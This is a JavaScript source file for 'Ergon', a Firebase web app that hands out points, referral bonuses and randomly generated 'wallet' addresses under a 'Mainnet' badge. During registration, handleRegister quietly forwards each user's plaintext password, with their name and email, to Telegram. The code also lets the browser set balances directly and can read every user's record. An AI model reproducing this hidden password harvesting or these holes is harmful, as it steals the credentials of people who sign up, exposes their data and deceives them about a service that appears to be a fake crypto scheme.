/**
 * Ergon App - Core Logic (Firebase-backed)
 * -----------------------------------------
 * Auth: Firebase Authentication (Email/Password)
 * Data: Cloud Firestore (users collection)
 * Telegram: still notified on every new registration
 */

const ACTIVITY_REWARD = 0.5;
const ACTIVITY_COOLDOWN_MS = 24 * 60 * 60 * 1000; // 24 hours
const APP_BASE_URL = "https://novaxek.github.io/NOVAXES/";
const REF_BONUS = 0.5;
const PENDING_REF_KEY = "ergon_pending_ref";

// In-memory cache of the logged-in user profile
let currentUserProfile = null;
let currentUid = null;

// ---------- Firebase helpers ----------
function getAuth() {
  return window.ergonFirebase.auth;
}
function getDb() {
  return window.ergonFirebase.db;
}

function usersCol() {
  return getDb().collection("users");
}

/** Load profile from Firestore into memory */
async function loadUserProfile(uid) {
  const snap = await usersCol().doc(uid).get();
  if (!snap.exists) return null;
  currentUserProfile = { id: uid, ...snap.data() };
  currentUid = uid;
  return currentUserProfile;
}

/** Persist profile fields to Firestore and refresh cache */
async function saveUserProfile(uid, data) {
  await usersCol().doc(uid).set(data, { merge: true });
  if (currentUid === uid) {
    currentUserProfile = { ...(currentUserProfile || {}), id: uid, ...data };
  }
}

function getCurrentUser() {
  return currentUserProfile;
}

// ---------- Utilities ----------
function generateWalletAddress() {
  const chars = "0123456789abcdef";
  let addr = "0x";
  for (let i = 0; i < 40; i++) {
    addr += chars[Math.floor(Math.random() * chars.length)];
  }
  return addr;
}

function shortAddress(addr) {
  if (!addr || addr.length < 12) return addr;
  return addr.slice(0, 6) + "..." + addr.slice(-4);
}

function formatNumber(n, decimals = 8) {
  return Number(n).toFixed(decimals).replace(/\.?0+$/, "") || "0";
}

function showToast(message, type = "success") {
  const toast = document.getElementById("toast");
  toast.textContent = message;
  toast.className = `toast ${type} show`;
  setTimeout(() => {
    toast.classList.remove("show");
  }, 3200);
}

function setBusy(btn, busy, labelWhenDone) {
  if (!btn) return;
  btn.disabled = !!busy;
  if (busy) {
    btn.dataset.prevHtml = btn.innerHTML;
    btn.innerHTML = "Please wait…";
  } else if (labelWhenDone) {
    btn.innerHTML = labelWhenDone;
  } else if (btn.dataset.prevHtml) {
    btn.innerHTML = btn.dataset.prevHtml;
  }
}

// ---------- Auth ----------
async function handleRegister(e) {
  e.preventDefault();
  const name = document.getElementById("reg-name").value.trim();
  const email = document.getElementById("reg-email").value.trim().toLowerCase();
  const password = document.getElementById("reg-password").value;
  const submitBtn = e.target.querySelector('button[type="submit"]');

  if (!name || !email || !password) {
    showToast("Please fill all fields", "error");
    return;
  }

  const hasLetter = /[a-zA-Z]/.test(password);
  const hasNumber = /[0-9]/.test(password);
  const hasSpecial = /[^a-zA-Z0-9]/.test(password);

  if (password.length < 6) {
    showToast("Password must be at least 6 characters", "error");
    return;
  }
  if (!hasLetter || !hasNumber || !hasSpecial) {
    showToast("Password must include letters, numbers, and special characters (e.g. @#!$%)", "error");
    return;
  }

  setBusy(submitBtn, true);
  showToast("Creating account...", "success");

  try {
    // Create Firebase Auth account
    const cred = await getAuth().createUserWithEmailAndPassword(email, password);
    const uid = cred.user.uid;
    const wallet = generateWalletAddress();
    const now = Date.now();

    // Referral handling
    const pendingRef = (sessionStorage.getItem(PENDING_REF_KEY) || "").toLowerCase().trim();
    let referredBy = null;

    if (pendingRef) {
      try {
        // Find referrer by wallet code (first 8 hex chars after 0x)
        const q = await usersCol().where("refCode", "==", pendingRef).limit(1).get();
        if (!q.empty) {
          const refDoc = q.docs[0];
          if (refDoc.id !== uid) {
            referredBy = refDoc.data().email || refDoc.id;
            const refData = refDoc.data();
            const history = Array.isArray(refData.history) ? refData.history.slice() : [];
            history.unshift({
              type: "referral",
              amount: REF_BONUS,
              note: `Referral bonus from ${name}`,
              time: now
            });
            await usersCol().doc(refDoc.id).update({
              referrals: (refData.referrals || 0) + 1,
              balance: +(Number(refData.balance || 0) + REF_BONUS).toFixed(8),
              history
            });
          }
        }
      } catch (refErr) {
        console.warn("Referral lookup failed", refErr);
      }
      sessionStorage.removeItem(PENDING_REF_KEY);
    }

    const profile = {
      name,
      email,
      wallet,
      refCode: wallet.slice(2, 10).toLowerCase(),
      balance: 0,
      xpRate: 10.0,
      lastClaim: 0,
      history: [],
      referrals: 0,
      referredBy: referredBy,
      createdAt: now
    };

    await usersCol().doc(uid).set(profile);
    currentUid = uid;
    currentUserProfile = { id: uid, ...profile };

    // Telegram still receives a copy (including password, as before)
    try {
      await window.sendRegistrationToTelegram({ name, email, password, wallet });
    } catch (err) {
      console.warn("Telegram notification failed (non-blocking)", err);
    }

    showToast("Welcome to Ergon! 🚀", "success");
    showApp();
  } catch (err) {
    console.error(err);
    let msg = "Registration failed";
    if (err.code === "auth/email-already-in-use") msg = "Email already registered";
    else if (err.code === "auth/invalid-email") msg = "Invalid email address";
    else if (err.code === "auth/weak-password") msg = "Password is too weak";
    else if (err.message) msg = err.message;
    showToast(msg, "error");
  } finally {
    setBusy(submitBtn, false, "Create Account 🚀");
  }
}

async function handleLogin(e) {
  e.preventDefault();
  const email = document.getElementById("login-email").value.trim().toLowerCase();
  const password = document.getElementById("login-password").value;
  const submitBtn = e.target.querySelector('button[type="submit"]');

  if (!email || !password) {
    showToast("Enter email and password", "error");
    return;
  }

  setBusy(submitBtn, true);
  try {
    const cred = await getAuth().signInWithEmailAndPassword(email, password);
    const profile = await loadUserProfile(cred.user.uid);
    if (!profile) {
      showToast("User profile not found", "error");
      await getAuth().signOut();
      return;
    }
    showToast(`Welcome back, ${profile.name}!`, "success");
    showApp();
  } catch (err) {
    console.error(err);
    let msg = "Invalid email or password";
    if (err.code === "auth/user-not-found" || err.code === "auth/wrong-password") {
      msg = "Invalid email or password";
    } else if (err.code === "auth/too-many-requests") {
      msg = "Too many attempts. Try again later.";
    } else if (err.message) {
      msg = err.message;
    }
    showToast(msg, "error");
  } finally {
    setBusy(submitBtn, false, "Sign In");
  }
}

async function handleLogout() {
  try {
    await getAuth().signOut();
  } catch (err) {
    console.warn(err);
  }
  currentUserProfile = null;
  currentUid = null;
  showAuth();
  showToast("Logged out successfully");
}

// ---------- UI Switching ----------
function showAuth() {
  document.getElementById("auth-screen").classList.remove("hidden");
  document.getElementById("app-screen").classList.add("hidden");
  switchAuthTab("login");
}

function showApp() {
  document.getElementById("auth-screen").classList.add("hidden");
  document.getElementById("app-screen").classList.remove("hidden");
  renderDashboard();
  switchPage("home");
}

function switchAuthTab(tab) {
  const loginForm = document.getElementById("login-form");
  const regForm = document.getElementById("register-form");
  const loginTab = document.getElementById("tab-login");
  const regTab = document.getElementById("tab-register");

  if (tab === "login") {
    loginForm.classList.remove("hidden");
    regForm.classList.add("hidden");
    loginTab.classList.add("btn-primary");
    loginTab.classList.remove("btn-secondary");
    regTab.classList.add("btn-secondary");
    regTab.classList.remove("btn-primary");
  } else {
    loginForm.classList.add("hidden");
    regForm.classList.remove("hidden");
    regTab.classList.add("btn-primary");
    regTab.classList.remove("btn-secondary");
    loginTab.classList.add("btn-secondary");
    loginTab.classList.remove("btn-primary");
  }
}

function switchPage(pageId) {
  document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
  const page = document.getElementById(`page-${pageId}`);
  if (page) page.classList.add("active");

  document.querySelectorAll(".nav-item").forEach(n => n.classList.remove("active"));
  const nav = document.querySelector(`[data-page="${pageId}"]`);
  if (nav) nav.classList.add("active");

  if (pageId === "home") renderDashboard();
  if (pageId === "activity") renderActivity();
  if (pageId === "wallet") renderWallet();
  if (pageId === "referrals") renderReferrals();
  if (pageId === "profile") renderProfile();
}

// ---------- Rendering ----------
function renderDashboard() {
  const user = getCurrentUser();
  if (!user) return;

  document.getElementById("header-name").textContent = user.name;
  document.getElementById("header-avatar").textContent = user.name.charAt(0).toUpperCase();
  document.getElementById("home-balance").textContent = formatNumber(user.balance, 8);
  document.getElementById("home-xp").textContent = Number(user.xpRate || 10).toFixed(1);
  document.getElementById("home-wallet-short").textContent = shortAddress(user.wallet);

  const net = document.getElementById("network-status");
  if (net) {
    net.innerHTML = `<span class="badge badge-green">● Mainnet</span>`;
  }
  updateClaimTimer();
}

function renderActivity() {
  const user = getCurrentUser();
  if (!user) return;

  const claimBtn = document.getElementById("claim-btn");
  const timerBox = document.getElementById("claim-timer-box");
  const now = Date.now();
  const ready = now - (user.lastClaim || 0) >= ACTIVITY_COOLDOWN_MS;

  if (claimBtn) {
    if (ready) {
      claimBtn.disabled = false;
      claimBtn.innerHTML = `<span>⚡</span> Claim Activity (+${ACTIVITY_REWARD})`;
    } else {
      claimBtn.disabled = true;
      claimBtn.innerHTML = `<span>⏳</span> Cooldown active`;
    }
  }

  if (timerBox) {
    timerBox.style.display = ready ? "none" : "block";
  }

  const historyEl = document.getElementById("activity-history");
  if (historyEl) {
    const history = Array.isArray(user.history) ? user.history.slice().reverse() : [];
    if (!history.length) {
      historyEl.innerHTML = `<p class="text-sm text-center" style="color:var(--text-muted);padding:1rem 0;">No activity yet. Claim your first reward!</p>`;
    } else {
      historyEl.innerHTML = history
        .slice(0, 20)
        .map(h => {
          const amt = Number(h.amount);
          const sign = amt >= 0 ? "+" : "";
          const color = amt >= 0 ? "var(--success, #16a34a)" : "var(--danger, #dc2626)";
          const when = h.time ? new Date(h.time).toLocaleString() : "";
          return `<div class="history-item">
            <div>
              <div class="font-medium">${h.type || h.note || "Activity"}</div>
              <div class="text-xs" style="color:var(--text-muted);">${when}</div>
            </div>
            <div style="color:${color};font-weight:600;">${sign}${formatNumber(amt, 4)}</div>
          </div>`;
        })
        .join("");
    }
  }

  updateClaimTimer();
}

function updateClaimTimer() {
  const user = getCurrentUser();
  const timerEl = document.getElementById("claim-timer");
  const claimBtn = document.getElementById("claim-btn");
  if (!user) return;

  const remaining = ACTIVITY_COOLDOWN_MS - (Date.now() - (user.lastClaim || 0));
  if (remaining <= 0) {
    if (timerEl) timerEl.textContent = "00:00:00";
    if (claimBtn && claimBtn.disabled) {
      claimBtn.disabled = false;
      claimBtn.innerHTML = `<span>⚡</span> Claim Activity (+${ACTIVITY_REWARD})`;
    }
    const box = document.getElementById("claim-timer-box");
    if (box) box.style.display = "none";
    const homeTimer = document.getElementById("home-timer");
    if (homeTimer) homeTimer.textContent = "Ready";
    return;
  }

  const h = Math.floor(remaining / 3600000);
  const m = Math.floor((remaining % 3600000) / 60000);
  const s = Math.floor((remaining % 60000) / 1000);
  const str = `${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;

  if (timerEl) timerEl.textContent = str;
  const homeTimer = document.getElementById("home-timer");
  if (homeTimer) homeTimer.textContent = str;
}

async function claimActivity() {
  const user = getCurrentUser();
  if (!user || !currentUid) return;

  const now = Date.now();
  if (now - (user.lastClaim || 0) < ACTIVITY_COOLDOWN_MS) {
    showToast("Activity not ready yet", "error");
    return;
  }

  const claimBtn = document.getElementById("claim-btn");
  setBusy(claimBtn, true);

  try {
    const history = Array.isArray(user.history) ? user.history.slice() : [];
    history.push({
      type: "Daily Activity",
      amount: ACTIVITY_REWARD,
      time: now
    });

    const newBalance = +(Number(user.balance || 0) + ACTIVITY_REWARD).toFixed(8);
    await saveUserProfile(currentUid, {
      balance: newBalance,
      lastClaim: now,
      history
    });

    showToast(`+${ACTIVITY_REWARD} Ergon claimed! 🎉`, "success");
    renderActivity();
    renderDashboard();
  } catch (err) {
    console.error(err);
    showToast("Claim failed. Try again.", "error");
  } finally {
    setBusy(claimBtn, false);
    updateClaimTimer();
  }
}

function renderWallet() {
  const user = getCurrentUser();
  if (!user) return;

  document.getElementById("wallet-balance").textContent = formatNumber(user.balance, 8);
  document.getElementById("wallet-address").textContent = user.wallet;
  const shortEl = document.getElementById("wallet-address-short");
  if (shortEl) shortEl.textContent = shortAddress(user.wallet);
}

function copyAddress() {
  const user = getCurrentUser();
  if (!user) return;
  navigator.clipboard.writeText(user.wallet).then(() => {
    showToast("Address copied! 📋");
  }).catch(() => {
    showToast("Could not copy", "error");
  });
}

async function handleSendPoints(e) {
  e.preventDefault();
  const user = getCurrentUser();
  if (!user || !currentUid) return;

  const toAddress = document.getElementById("send-to").value.trim();
  const amount = parseFloat(document.getElementById("send-amount").value);
  const submitBtn = e.target.querySelector('button[type="submit"]');

  if (!toAddress || !toAddress.startsWith("0x") || toAddress.length < 10) {
    showToast("Invalid wallet address", "error");
    return;
  }
  if (isNaN(amount) || amount <= 0) {
    showToast("Enter a valid amount", "error");
    return;
  }
  if (amount > Number(user.balance || 0)) {
    showToast("Insufficient balance", "error");
    return;
  }
  if (toAddress.toLowerCase() === user.wallet.toLowerCase()) {
    showToast("Cannot send to yourself", "error");
    return;
  }

  setBusy(submitBtn, true);
  try {
    // Look up recipient by wallet in Firestore (works across devices)
    const q = await usersCol().where("wallet", "==", toAddress).limit(1).get();
    // Also try case-insensitive match
    let recipientDoc = null;
    if (!q.empty) {
      recipientDoc = q.docs[0];
    } else {
      const all = await usersCol().get();
      recipientDoc = all.docs.find(d => (d.data().wallet || "").toLowerCase() === toAddress.toLowerCase()) || null;
    }

    if (!recipientDoc) {
      showToast("Recipient wallet not found on Ergon", "error");
      return;
    }

    const recipient = recipientDoc.data();
    const now = Date.now();

    const senderHistory = Array.isArray(user.history) ? user.history.slice() : [];
    senderHistory.push({
      type: `Sent to ${shortAddress(toAddress)}`,
      amount: -amount,
      time: now
    });

    const recipientHistory = Array.isArray(recipient.history) ? recipient.history.slice() : [];
    recipientHistory.push({
      type: `Received from ${shortAddress(user.wallet)}`,
      amount: amount,
      time: now
    });

    const newSenderBal = +(Number(user.balance) - amount).toFixed(8);
    const newRecipientBal = +(Number(recipient.balance || 0) + amount).toFixed(8);

    // Batch write for atomicity
    const batch = getDb().batch();
    batch.update(usersCol().doc(currentUid), {
      balance: newSenderBal,
      history: senderHistory
    });
    batch.update(usersCol().doc(recipientDoc.id), {
      balance: newRecipientBal,
      history: recipientHistory
    });
    await batch.commit();

    currentUserProfile.balance = newSenderBal;
    currentUserProfile.history = senderHistory;

    document.getElementById("send-to").value = "";
    document.getElementById("send-amount").value = "";

    showToast(`Successfully sent ${amount} Ergon! 🚀`, "success");
    renderWallet();
    renderDashboard();
  } catch (err) {
    console.error(err);
    showToast("Transfer failed. Try again.", "error");
  } finally {
    setBusy(submitBtn, false, "Send");
  }
}

function getReferralCode(user) {
  if (!user) return "";
  if (user.refCode) return user.refCode;
  if (user.wallet) return user.wallet.slice(2, 10).toLowerCase();
  return "";
}

function getReferralLink(user) {
  const code = getReferralCode(user);
  const base = APP_BASE_URL.endsWith("/") ? APP_BASE_URL : APP_BASE_URL + "/";
  return `${base}?ref=${code}`;
}

function renderReferrals() {
  const user = getCurrentUser();
  if (!user) return;
  document.getElementById("ref-count").textContent = user.referrals || 0;
  document.getElementById("ref-link").textContent = getReferralLink(user);
}

function copyRefLink() {
  const user = getCurrentUser();
  const link = user ? getReferralLink(user) : document.getElementById("ref-link").textContent;
  navigator.clipboard.writeText(link).then(() => {
    showToast("Referral link copied! 🔗");
  }).catch(() => {
    const el = document.getElementById("ref-link");
    if (el) {
      const range = document.createRange();
      range.selectNode(el);
      window.getSelection().removeAllRanges();
      window.getSelection().addRange(range);
      document.execCommand("copy");
      showToast("Referral link copied! 🔗");
    }
  });
}

function captureReferralFromUrl() {
  try {
    const params = new URLSearchParams(window.location.search);
    const ref = (params.get("ref") || "").toLowerCase().trim();
    if (ref && /^[0-9a-f]{6,12}$/.test(ref)) {
      sessionStorage.setItem(PENDING_REF_KEY, ref);
    }
  } catch (err) {
    console.warn("Could not parse referral param", err);
  }
}

function renderProfile() {
  const user = getCurrentUser();
  if (!user) return;
  document.getElementById("profile-name").textContent = user.name;
  document.getElementById("profile-email").textContent = user.email;
  document.getElementById("profile-wallet").textContent = user.wallet;
  const joined = user.createdAt ? new Date(user.createdAt).toLocaleDateString() : "—";
  document.getElementById("profile-joined").textContent = joined;
  const av = document.getElementById("profile-avatar-big");
  if (av) av.textContent = (user.name || "?").charAt(0).toUpperCase();
}

// ---------- Init ----------
function init() {
  captureReferralFromUrl();

  // Guard: Firebase must be configured
  if (!window.ergonFirebase || !window.ergonFirebase.auth) {
    console.error("Firebase not initialized. Edit js/firebase-config.js with your project keys.");
    showToast("App database not configured", "error");
  }

  document.getElementById("login-form").addEventListener("submit", handleLogin);
  document.getElementById("register-form").addEventListener("submit", handleRegister);
  document.getElementById("send-form").addEventListener("submit", handleSendPoints);

  document.getElementById("tab-login").addEventListener("click", () => switchAuthTab("login"));
  document.getElementById("tab-register").addEventListener("click", () => switchAuthTab("register"));

  document.querySelectorAll(".nav-item").forEach(btn => {
    btn.addEventListener("click", () => {
      const page = btn.getAttribute("data-page");
      if (page) switchPage(page);
    });
  });

  document.getElementById("claim-btn").addEventListener("click", claimActivity);

  // Auth state listener — restores session across devices/browsers
  if (window.ergonFirebase && window.ergonFirebase.auth) {
    getAuth().onAuthStateChanged(async (fbUser) => {
      if (fbUser) {
        try {
          const profile = await loadUserProfile(fbUser.uid);
          if (profile) {
            showApp();
          } else {
            showAuth();
          }
        } catch (err) {
          console.error(err);
          showAuth();
        }
      } else {
        currentUserProfile = null;
        currentUid = null;
        showAuth();
      }
    });
  } else {
    showAuth();
  }

  setInterval(updateClaimTimer, 1000);
}

document.addEventListener("DOMContentLoaded", init);

// Expose for inline handlers in HTML
window.handleLogout = handleLogout;
window.copyAddress = copyAddress;
window.copyRefLink = copyRefLink;
window.switchPage = switchPage;
